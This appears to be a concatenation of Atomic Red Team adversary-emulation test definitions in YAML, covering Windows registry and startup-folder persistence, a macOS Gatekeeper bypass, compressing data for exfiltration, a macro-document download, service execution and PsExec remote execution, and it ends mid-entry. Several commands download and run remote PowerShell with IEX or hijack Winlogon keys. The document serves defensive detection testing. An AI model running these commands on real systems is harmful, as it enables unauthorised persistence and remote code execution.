    Upon successful execution, cmd.exe will modify the registry by adding \"Atomic Red Team\" to the Run key. Output will be via stdout. 
  supported_platforms:
  - windows
  input_arguments:
    command_to_execute:
      description: Thing to Run
      type: Path
      default: C:\Path\AtomicRedTeam.exe
  executor:
    command: |
      REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /t REG_SZ /F /D "#{command_to_execute}"
    cleanup_command: |
      REG DELETE "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /f >nul 2>&1
    name: command_prompt
- name: Reg Key RunOnce
  auto_generated_guid: 554cbd88-cde1-4b56-8168-0be552eed9eb
  description: |
    RunOnce Key Persistence.

    Upon successful execution, cmd.exe will modify the registry to load AtomicRedTeam.dll to RunOnceEx. Output will be via stdout. 
  supported_platforms:
  - windows
  input_arguments:
    thing_to_execute:
      description: Thing to Run
      type: Path
      default: C:\Path\AtomicRedTeam.dll
  executor:
    command: |
      REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "#{thing_to_execute}"
    cleanup_command: |
      REG DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /f >nul 2>&1
    name: command_prompt
    elevation_required: true
- name: PowerShell Registry RunOnce
  auto_generated_guid: eb44f842-0457-4ddc-9b92-c4caa144ac42
  description: |
    RunOnce Key Persistence via PowerShell
    Upon successful execution, a new entry will be added to the runonce item in the registry.
  supported_platforms:
  - windows
  input_arguments:
    thing_to_execute:
      description: Thing to Run
      type: Path
      default: powershell.exe
    reg_key_path:
      description: Path to registry key to update
      type: Path
      default: HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce
  executor:
    command: |
      $RunOnceKey = "#{reg_key_path}"
      set-itemproperty $RunOnceKey "NextRun" '#{thing_to_execute} "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/36f83b728bc26a49eacb0535edc42be8c377ac54/ARTifacts/Misc/Discovery.bat`")"'
    cleanup_command: |
      Remove-ItemProperty -Path #{reg_key_path} -Name "NextRun" -Force -ErrorAction Ignore
    name: powershell
    elevation_required: true
- name: Suspicious vbs file run from startup Folder
  auto_generated_guid: 2cb98256-625e-4da9-9d44-f2e5f90b8bd5
  description: |
    vbs files can be placed in and ran from the startup folder to maintain persistance. Upon execution, "T1547.001 Hello, World VBS!" will be displayed twice. 
    Additionally, the new files can be viewed in the "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
    folder and will also run when the computer is restarted and the user logs in.
  supported_platforms:
  - windows
  executor:
    command: |
      Copy-Item $PathToAtomicsFolder\T1547.001\src\vbsstartup.vbs "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs"
      Copy-Item $PathToAtomicsFolder\T1547.001\src\vbsstartup.vbs "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs"
      cscript.exe "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs"
      cscript.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs"
    cleanup_command: |
      Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs" -ErrorAction Ignore
      Remove-Item "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs" -ErrorAction Ignore
    name: powershell
    elevation_required: true
- name: Suspicious jse file run from startup Folder
  auto_generated_guid: dade9447-791e-4c8f-b04b-3a35855dfa06
  description: |
    jse files can be placed in and ran from the startup folder to maintain persistance.
    Upon execution, "T1547.001 Hello, World JSE!" will be displayed twice. 
    Additionally, the new files can be viewed in the "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
    folder and will also run when the computer is restarted and the user logs in.
  supported_platforms:
  - windows
  executor:
    command: |
      Copy-Item $PathToAtomicsFolder\T1547.001\src\jsestartup.jse "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse"
      Copy-Item $PathToAtomicsFolder\T1547.001\src\jsestartup.jse "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse"
      cscript.exe /E:Jscript "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse"
      cscript.exe /E:Jscript "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse"
    cleanup_command: |
      Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse" -ErrorAction Ignore
      Remove-Item "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse" -ErrorAction Ignore
    name: powershell
    elevation_required: true
- name: Suspicious bat file run from startup Folder
  auto_generated_guid: 5b6768e4-44d2-44f0-89da-a01d1430fd5e
  description: |
    bat files can be placed in and executed from the startup folder to maintain persistance.
    Upon execution, cmd will be run and immediately closed. Additionally, the new files can be viewed in the "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
    folder and will also run when the computer is restarted and the user logs in.
  supported_platforms:
  - windows
  executor:
    command: |
      Copy-Item $PathToAtomicsFolder\T1547.001\src\batstartup.bat "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat"
      Copy-Item $PathToAtomicsFolder\T1547.001\src\batstartup.bat "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat"
      Start-Process "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat"
      Start-Process "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat"
    cleanup_command: |
      Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat" -ErrorAction Ignore
      Remove-Item "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat" -ErrorAction Ignore
    name: powershell
    elevation_required: true
    
- name: Add Executable Shortcut Link to User Startup Folder
  auto_generated_guid: 24e55612-85f6-4bd6-ae74-a73d02e3441d
  description: 'Adds a non-malicious executable shortcut link to the current users startup directory. Test can be verified by going to the users startup directory and checking if the shortcut link exists. '
  supported_platforms:
  - windows
  executor:
    command: |-
      $Target = "C:\Windows\System32\calc.exe"
      $ShortcutLocation = "$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\calc_exe.lnk"
      $WScriptShell = New-Object -ComObject WScript.Shell
      $Create = $WScriptShell.CreateShortcut($ShortcutLocation)
      $Create.TargetPath = $Target
      $Create.Save()      
    cleanup_command: Remove-Item "$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\calc_exe.lnk" -ErrorAction Ignore
    name: powershell
    elevation_required: true 

- name: Add persistance via Recycle bin
  auto_generated_guid: bda6a3d6-7aa7-4e89-908b-306772e9662f
  description: |
    Add a persistance via Recycle bin [vxunderground](https://github.com/vxunderground/VXUG-Papers/blob/main/The%20Persistence%20Series/Persistence%20via%20Recycle%20Bin/Persistence_via_Recycle_Bin.pdf)
    User have to clic on the recycle bin to lauch the payload (here calc)
  supported_platforms:
  - windows
  executor:
    command: reg ADD "HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command" /ve /d "calc.exe" /f  
    cleanup_command: reg DELETE "HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open" /f
    name: command_prompt

- name: SystemBC Malware-as-a-Service Registry
  auto_generated_guid: 9dc7767b-30c1-4cc4-b999-50cab5e27891
  description: |
      This Atomic will create a registry key called socks5_powershell for persistance access
      https://medium.com/walmartglobaltech/systembc-powershell-version-68c9aad0f85c
  supported_platforms:
  - windows
  input_arguments:
    reg_key_value:
      description: Thing to Run
      type: Path
      default: powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File
    reg_key_path:
      description: Path to registry key to update
      type: Path
      default: HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
  executor:
    command: |
      $RunKey = "#{reg_key_path}"
      Set-ItemProperty -Path $RunKey -Name "socks5_powershell" -Value "#{reg_key_value}"
    cleanup_command: |
      Remove-ItemProperty -Path #{reg_key_path} -Name "socks5_powershell" -Force -ErrorAction Ignore
    name: powershell
    
- name: Change Startup Folder - HKLM Modify User Shell Folders Common Startup Value
  auto_generated_guid: acfef903-7662-447e-a391-9c91c2f00f7b
  description: |
    This test will modify the HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders -V "Common Startup" 
    value to point to a new startup folder where a payload could be stored to launch at boot.  *successful execution requires system restart
  supported_platforms:
  - windows
  input_arguments:
    new_startup_folder:
      description: new startup folder to replace standard one
      type: String
      default: $env:TMP\atomictest\
    payload:
      description: 'executable to be placed in new startup location '
      type: String
      default: C:\Windows\System32\calc.exe
  executor:
    command: |
      New-Item -ItemType Directory -path "#{new_startup_folder}"
      Copy-Item -path "#{payload}" -destination "#{new_startup_folder}"
      Set-ItemProperty -Path  "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" -Name "Common Startup" -Value "#{new_startup_folder}"
    cleanup_command: |
      Set-ItemProperty -Path  "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" -Name "Common Startup" -Value "%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup"
      Remove-Item "#{new_startup_folder}" -Recurse -Force
    name: powershell
    elevation_required: true

- name: Change Startup Folder - HKCU Modify User Shell Folders Startup Value
  auto_generated_guid: 8834b65a-f808-4ece-ad7e-2acdf647aafa
  description: | 
    This test will modify the HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders  -V "Startup" value 
    to point to a new startup folder where a payload could be stored to launch at boot.  *successful execution requires system restart
  supported_platforms:
  - windows
  input_arguments:
    new_startup_folder:
      description: new startup folder to replace standard one
      type: String
      default: $env:TMP\atomictest\
    payload:
      description: 'executable to be placed in new startup location '
      type: String
      default: C:\Windows\System32\calc.exe
  executor:
    command: | 
        New-Item -ItemType Directory -path "#{new_startup_folder}"
        Copy-Item -path "#{payload}" -destination "#{new_startup_folder}"
        Set-ItemProperty -Path  "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" -Name "Startup" -Value "#{new_startup_folder}"
    cleanup_command: |
        Set-ItemProperty -Path  "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" -Name "Startup" -Value "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
        Remove-Item "#{new_startup_folder}" -Recurse -Force
    name: powershell
    elevation_required: true

- name: HKCU - Policy Settings Explorer Run Key
  auto_generated_guid: a70faea1-e206-4f6f-8d9a-67379be8f6f1
  description: | 
    This test will create a new value under HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run to launch calc.exe on boot. 
    *Requires reboot
  supported_platforms:
  - windows
  input_arguments:
    target_key_value_name:
      description: registry value to crate on target key
      type: string
      default: atomictest
    payload:
      description: 'payload to execute'
      type: String
      default: C:\Windows\System32\calc.exe
  executor:
    command: |
      if (!(Test-Path -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run")){
        New-Item -ItemType Key -Path  "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"
      }
      Set-ItemProperty -Path  "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" -Name "#{target_key_value_name}" -Value "#{payload}"
    cleanup_command: Remove-ItemProperty -Path  "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" -Name "#{target_key_value_name}"
    name: powershell
    elevation_required: true

- name: HKLM - Policy Settings Explorer Run Key
  auto_generated_guid: b5c9a9bc-dda3-4ea0-b16a-add8e81ab75f
  description: | 
    This test will create a HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run key value to launch calc.exe on boot. 
    *Requires reboot
  supported_platforms:
  - windows
  input_arguments:
    target_key_value_name:
      description: registry value to crate on target key
      type: string
      default: atomictest
    payload:
      description: 'payload to execute'
      type: String
      default: C:\Windows\System32\calc.exe
  executor:
    command: |
      if (!(Test-Path -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run")){
        New-Item -ItemType Key -Path  "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"
      }
      Set-ItemProperty -Path  "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" -Name "#{target_key_value_name}" -Value "#{payload}"
    cleanup_command: Remove-ItemProperty -Path  "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" -Name "#{target_key_value_name}"
    name: powershell
    elevation_required: true

- name: HKLM - Append Command to Winlogon Userinit KEY Value
  auto_generated_guid: f7fab6cc-8ece-4ca7-a0f1-30a22fccd374
  description: | 
    This test will append a command to the  HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit value to launch calc.exe on boot.
    * Requires reboot
  supported_platforms:
  - windows
  input_arguments:
    payload:
      description: what to run
      type: String
      default: C:\Windows\System32\calc.exe
  executor:
    command: |
      $oldvalue = $(Get-ItemPropertyValue -Path  "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Userinit");
      Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Userinit-backup" -Value "$oldvalue";
      $newvalue = $oldvalue + " #{payload}";
      Set-ItemProperty -Path  "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Userinit" -Value "$newvalue"
    cleanup_command: |-
      $oldvalue = $(Get-ItemPropertyValue -Path  "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name 'Userinit-backup');
      Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Userinit" -Value "$oldvalue";
      Remove-ItemProperty -Path  "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name 'Userinit-backup'
    name: powershell
    elevation_required: true

- name: 'HKLM - Modify default System Shell - Winlogon Shell KEY Value '
  auto_generated_guid: 1d958c61-09c6-4d9e-b26b-4130314e520e
  description: | 
    This test change the default value of HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell from "explorer.exe" to the full path of "C:\Windows\explorer.exe" 
    to log a change to the key's default value without breaking boot sequence. 
    An atacker will alternatively replace this with a custom shell. 
  supported_platforms:
  - windows
  input_arguments:
    payload:
      description: what to run
      type: String
      default: C:\Windows\explorer.exe
  executor:
    command: |
      $oldvalue = $(Get-ItemPropertyValue -Path  "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell");
      Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell-backup" -Value "$oldvalue";
      $newvalue = $oldvalue + ", #{payload}";
      Set-ItemProperty -Path  "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell" -Value "$newvalue"
    cleanup_command: |-
      $oldvalue = $(Get-ItemPropertyValue -Path  "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name 'Shell-backup');
      Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell" -Value "$oldvalue";
      Remove-ItemProperty -Path  "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name 'Shell-backup'
    name: powershell
    elevation_required: true



- name: Gatekeeper Bypass
  auto_generated_guid: fb3d46c6-9480-4803-8d7d-ce676e1f1a9b
  description: |
    Gatekeeper Bypass via command line
  supported_platforms:
  - macos
  input_arguments:
    app_path:
      description: Path to app to be used
      type: Path
      default: myapp.app
  executor:
    command: |
      sudo xattr -d com.apple.quarantine #{app_path}
    elevation_required: true
    name: sh



- name: Compress Data for Exfiltration With Rar
  auto_generated_guid: 02ea31cb-3b4c-4a2d-9bf1-e4e70ebcf5d0
  description: |
    An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration.
    When the test completes you should find the txt files from the %USERPROFILE% directory compressed in a file called T1560.001-data.rar in the %USERPROFILE% directory 
  supported_platforms:
    - windows
  input_arguments:
    input_path:
      description: Path that should be compressed into our output file
      type: Path
      default: '%USERPROFILE%'
    file_extension:
      description: Extension of files to compress
      type: String
      default: ".txt"
    output_file:
      description: Path where resulting compressed data should be placed
      type: Path
      default: '%USERPROFILE%\T1560.001-data.rar'
    rar_installer:
      description: Winrar installer
      type: Path
      default: '%TEMP%\winrar.exe'
    rar_exe:
      description: The RAR executable from Winrar
      type: Path
      default: '%programfiles%/WinRAR/Rar.exe'
  dependencies:
    - description: |
        Rar tool must be installed at specified location (#{rar_exe})
      prereq_command: |
        if not exist "#{rar_exe}" (exit /b 1)
      get_prereq_command: |
        echo Downloading Winrar installer
        bitsadmin /transfer myDownloadJob /download /priority normal "https://www.win-rar.com/fileadmin/winrar-versions/winrar/th/winrar-x64-580.exe" #{rar_installer}
        #{rar_installer} /S
  executor:
    name: command_prompt
    elevation_required: false
    command: |
      "#{rar_exe}" a -r #{output_file} #{input_path}\*#{file_extension}
    cleanup_command: |
      del /f /q /s #{output_file} >nul 2>&1
- name: Compress Data and lock with password for Exfiltration with winrar
  auto_generated_guid: 8dd61a55-44c6-43cc-af0c-8bdda276860c
  description: |
    Note: Requires winrar installation
    rar a -p"blue" hello.rar (VARIANT)
  supported_platforms:
    - windows
  input_arguments:
    rar_installer:
      description: Winrar installer
      type: Path
      default: '%TEMP%\winrar.exe'
    rar_exe:
      description: The RAR executable from Winrar
      type: Path
      default: '%programfiles%/WinRAR/Rar.exe'
  dependencies:
  - description: |
      Rar tool must be installed at specified location (#{rar_exe})
    prereq_command: |
      if not exist "#{rar_exe}" (exit /b 1)
    get_prereq_command: |
      echo Downloading Winrar installer
      bitsadmin /transfer myDownloadJob /download /priority normal "https://www.win-rar.com/fileadmin/winrar-versions/winrar/th/winrar-x64-580.exe" #{rar_installer}
      #{rar_installer} /S
  executor:
    name: command_prompt
    elevation_required: false
    command: |
      mkdir .\tmp\victim-files
      cd .\tmp\victim-files
      echo "This file will be encrypted" > .\encrypted_file.txt
      "#{rar_exe}" a -hp"blue" hello.rar
      dir
- name: Compress Data and lock with password for Exfiltration with winzip
  auto_generated_guid: 01df0353-d531-408d-a0c5-3161bf822134
  description: |
    Note: Requires winzip installation
    wzzip sample.zip -s"blueblue" *.txt (VARIANT)
  supported_platforms:
    - windows
  input_arguments:
    winzip_exe:
      description: Path to installed Winzip executable
      type: Path
      default: "%ProgramFiles%\\WinZip\\winzip64.exe"
    winzip_url:
      description: Path to download Windows Credential Editor zip file
      type: Url
      default: https://download.winzip.com/gl/nkln/winzip24-home.exe
    winzip_hash:
      description: File hash of the Windows Credential Editor zip file
      type: String
      default: B59DB592B924E963C21DA8709417AC0504F6158CFCB12FE5536F4A0E0D57D7FB
  dependency_executor_name: powershell
  dependencies:
    - description: |
        Winzip must be installed
      prereq_command: |
        cmd /c 'if not exist "#{winzip_exe}" (echo 1) else (echo 0)'
      get_prereq_command: |
        if(Invoke-WebRequestVerifyHash "#{winzip_url}" "$env:Temp\winzip.exe" #{winzip_hash}){
          Write-Host Follow the installation prompts to continue
          cmd /c "$env:Temp\winzip.exe"
        }
  executor:
    name: command_prompt
    elevation_required: false
    command: |
      path=%path%;"C:\Program Files (x86)\winzip"
      mkdir .\tmp\victim-files
      cd .\tmp\victim-files
      echo "This file will be encrypted" > .\encrypted_file.txt
      "#{winzip_exe}" -min -a -s"hello" archive.zip *
      dir
- name: Compress Data and lock with password for Exfiltration with 7zip
  auto_generated_guid: d1334303-59cb-4a03-8313-b3e24d02c198
  description: |
    Note: Requires 7zip installation
  supported_platforms:
    - windows
  input_arguments:
    7zip_installer:
      description: 7zip installer
      type: Path
      default: "%TEMP%\\7zip.exe"  
    7zip_exe:
      description: Path to installed 7zip executable
      type: Path
      default: "%ProgramFiles%\\7-zip\\7z.exe"
  dependencies:
  - description: |
      7zip tool must be installed at specified location (#{7zip_exe})
    prereq_command: |
      if not exist "#{7zip_exe}" (exit /b 1)
    get_prereq_command: |
      echo Downloading 7-zip installer
      bitsadmin /transfer myDownloadJob /download /priority normal "https://www.7-zip.org/a/7z2002-x64.exe" #{7zip_installer}
      #{7zip_installer} /S
  executor:
    name: command_prompt
    elevation_required: false
    command: |
      mkdir $PathToAtomicsFolder\T1560.001\victim-files
      cd $PathToAtomicsFolder\T1560.001\victim-files
      echo "This file will be encrypted" > .\encrypted_file.txt
      "#{7zip_exe}" u archive.7z *txt -pblue
      dir
- name: Data Compressed - nix - zip
  auto_generated_guid: c51cec55-28dd-4ad2-9461-1eacbc82c3a0
  description: |
    An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration. This test uses standard zip compression.
  supported_platforms:
    - linux
    - macos
  input_arguments:
    input_files:
      description: Path that should be compressed into our output file, may include wildcards
      type: Path
      default: /var/log/{w,b}tmp
    output_file:
      description: Path that should be output as a zip archive
      type: Path
      default: $HOME/data.zip
  dependencies:
    - description: |
        Files to zip must exist (#{input_files})
      prereq_command: |
        if [ $(ls #{input_files} | wc -l) > 0 ] && [ -x $(which zip) ] ; then exit 0; else exit 1; fi;
      get_prereq_command: |
        (which yum && yum -y install epel-release zip)||(which apt-get && apt-get install -y zip)
        echo Please set input_files argument to include files that exist
  executor:
    name: sh
    elevation_required: false
    command: |
      zip #{output_file} #{input_files}
    cleanup_command: |
      rm -f #{output_file}
- name: Data Compressed - nix - gzip Single File
  auto_generated_guid: cde3c2af-3485-49eb-9c1f-0ed60e9cc0af
  description: |
    An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration. This test uses standard gzip compression.
  supported_platforms:
    - linux
    - macos
  input_arguments:
    input_file:
      description: Path that should be compressed
      type: Path
      default: $HOME/victim-gzip.txt
    input_content:
      description: contents of compressed files if file does not already exist. default contains test credit card and social security number
      type: String
      default: 'confidential! SSN: 078-05-1120 - CCN: 4000 1234 5678 9101'
  executor:
    name: sh
    elevation_required: false
    command: |
      test -e #{input_file} && gzip -k #{input_file} || (echo '#{input_content}' >> #{input_file}; gzip -k #{input_file})
    cleanup_command: |
      rm -f #{input_file}.gz
- name: Data Compressed - nix - tar Folder or File
  auto_generated_guid: 7af2b51e-ad1c-498c-aca8-d3290c19535a
  description: |
    An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration. This test uses standard gzip compression.
  supported_platforms:
    - linux
    - macos
  input_arguments:
    input_file_folder:
      description: Path that should be compressed
      type: Path
      default: '$HOME/$USERNAME'
    output_file:
      description: File that should be output
      type: Path
      default: '$HOME/data.tar.gz'
  dependencies:
    - description: |
        Folder to zip must exist (#{input_file_folder})
      prereq_command: |
        test -e #{input_file_folder}
      get_prereq_command: |
        echo Please set input_file_folder argument to a folder that exists
  executor:
    name: sh
    elevation_required: false
    command: |
      tar -cvzf #{output_file} #{input_file_folder}
    cleanup_command: |
      rm -f #{output_file}
- name: Data Encrypted with zip and gpg symmetric
  auto_generated_guid: 0286eb44-e7ce-41a0-b109-3da516e05a5f
  description: |
    Encrypt data for exiltration
  supported_platforms:
    - macos
    - linux
  input_arguments:
    test_folder:
      description: Path used to store files.
      type: Path
      default: /tmp/T1560
    test_file:
      description: Temp file used to store encrypted data.
      type: Path
      default: T1560
    encryption_password:
      description: Password used to encrypt data.
      type: String
      default: InsertPasswordHere
  dependency_executor_name: sh
  dependencies:
    - description: gpg and zip are required to run the test.
      prereq_command: |
        if [ ! -x "$(command -v gpg)" ] || [ ! -x "$(command -v zip)" ]; then exit 1; fi;
      get_prereq_command: |
        (which yum && yum -y install epel-release zip gpg)||(which apt-get && apt-get install -y zip gpg)
  executor:
    name: sh
    elevation_required: false
    command: |
      mkdir -p #{test_folder}
      cd #{test_folder}; touch a b c d e f g
      zip --password "#{encryption_password}" #{test_folder}/#{test_file} ./*
      echo "#{encryption_password}" | gpg --batch --yes --passphrase-fd 0 --output #{test_folder}/#{test_file}.zip.gpg -c #{test_folder}/#{test_file}.zip
      ls -l #{test_folder}
    cleanup_command: |
      rm -Rf #{test_folder}



- name: Download Macro-Enabled Phishing Attachment
  auto_generated_guid: 114ccff9-ae6d-4547-9ead-4cd69f687306
  description: |
    This atomic test downloads a macro enabled document from the Atomic Red Team GitHub repository, simulating an end user clicking a phishing link to download the file.
    The file "PhishingAttachment.xlsm" is downloaded to the %temp% directory.
  supported_platforms:
  - windows
  executor:
    command: |
      $url = 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1566.001/bin/PhishingAttachment.xlsm'
      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
      Invoke-WebRequest -Uri $url -OutFile $env:TEMP\PhishingAttachment.xlsm
    name: powershell
    cleanup_command: |
      Remove-Item $env:TEMP\PhishingAttachment.xlsm -ErrorAction Ignore

- name: Word spawned a command shell and used an IP address in the command line
  auto_generated_guid: cbb6799a-425c-4f83-9194-5447a909d67f
  description: |
    Word spawning a command prompt then running a command with an IP address in the command line is an indiciator of malicious activity.
    Upon execution, CMD will be lauchned and ping 8.8.8.8
  supported_platforms:
  - windows
  input_arguments:
    jse_path:
      description: |
        Path for the macro to write out the "malicious" .jse file
      type: String
      default: C:\Users\Public\art.jse
    ms_product:
      description: Maldoc application Word or Excel
      type: String
      default: Word
  dependency_executor_name: powershell
  dependencies:
  - description: |
      Microsoft #{ms_product} must be installed
    prereq_command: |
      try {
        New-Object -COMObject "#{ms_product}.Application" | Out-Null
        $process = "#{ms_product}"; if ( $process -eq "Word") {$process = "winword"}
        Stop-Process -Name $process
        exit 0
      } catch { exit 1 }
    get_prereq_command: |
      Write-Host "You will need to install Microsoft #{ms_product} manually to meet this requirement"
  executor:
    command: |
      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
      $macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"ping 8.8.8.8`"`n"
      Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"
    cleanup_command: |
      Remove-Item #{jse_path} -ErrorAction Ignore
    name: powershell



- name: Execute a Command as a Service
  auto_generated_guid: 2382dee2-a75f-49aa-9378-f52df6ed3fb1
  description: |
    Creates a service specifying an arbitrary command and executes it. When executing commands such as PowerShell, the service will report that it did not start correctly even when code executes properly.

    Upon successful execution, cmd.exe creates a new service using sc.exe that will start powershell.exe to create a new file `art-marker.txt`
    
    [BlackCat Ransomware (ALPHV)](https://www.varonis.com/blog/blackcat-ransomware)  
    [Cybereason vs. BlackCat Ransomware](https://www.cybereason.com/blog/cybereason-vs.-blackcat-ransomware)
  supported_platforms:
  - windows
  input_arguments:
    service_name:
      description: Name of service to create
      type: String
      default: ARTService
    executable_command:
      description: Command to execute as a service
      type: String
      default: '%COMSPEC% /c powershell.exe -nop -w hidden -command New-Item -ItemType File C:\art-marker.txt'
  executor:
    command: |
      sc.exe create #{service_name} binPath= "#{executable_command}"
      sc.exe start #{service_name}
      sc.exe delete #{service_name}
    cleanup_command: |
      del C:\art-marker.txt >nul 2>&1
    name: command_prompt
    elevation_required: true
- name: Use PsExec to execute a command on a remote host
  auto_generated_guid: 873106b7-cfed-454b-8680-fa9f6400431c
  description: |
    Requires having Sysinternals installed, path to sysinternals is one of the input input_arguments
    Will start a process on a remote host.

    Upon successful execution, cmd will utilize psexec.exe to spawn calc.exe on a remote endpoint (default:localhost).
  supported_platforms:
  - windows
  input_arguments:
    remote_host:
      description: Remote hostname or IP address
      type: String
      default: localhost
    user_name:
      description: Username
      type: String
      default: DOMAIN\Administrator
    password:
      description: Password
      type: String
      default: P@ssw0rd1
    psexec_exe:
      description: Path to PsExec
      type: String
      default: C:\PSTools\PsExec.exe
  dependency_executor_name: powershell
  dependencies:
  - description: |
      PsExec tool from Sysinternals must exist on disk at specified location (#{psexec_exe})
    prereq_command: |
      if (Test-Path "#{psexec_exe}") { exit 0} else { exit 1}
    get_prereq_command: |
      Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PsTools.zip"
      Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
      New-Item -ItemType Directory (Split-Path "#{psexec_exe}") -Force | Out-Null
      Copy-Item $env:TEMP\PsTools\PsExec.exe "#{psexec_exe}" -Force
  executor:
    command: |
      #{psexec_exe} \\#{remote_host} -u #{user_name} -p #{password} -accepteula "C:\Windows\System32\calc.exe"
    name: command_prompt


- name: psexec.py (Impacket)
  auto_generated_guid: edbcd8c9-3639-4844-afad-455c91e95a35
  description: |
    Will execute a command on the remote host with Impacket psexec.py script.
  supported_platforms:
  - linux
  input_arguments:
    remote_host:
      description: Remote hostname or IP address
      type: String
      default: "127.0.0.1"
    username:
      description: Username
      type: String
      default: "Administrator"
    domain:
      description: Target domain
      type: String
      default: ""
    password:
      description: Password
      type: String
      default: "P@ssw0rd1"
    command:
      description: Command to execute in target computer
      type: String
      default: "whoami"
  dependency_executor_name: bash
  dependencies:
  - description: |
      psexec.py (Impacket)

    prereq_command: |
      if [ -x "$(command -v psexec.py)" ]; then exit 0; else exit 1; fi;

    get_prereq_command: |
      sudo pip3 install impacket

  executor:
    command: |
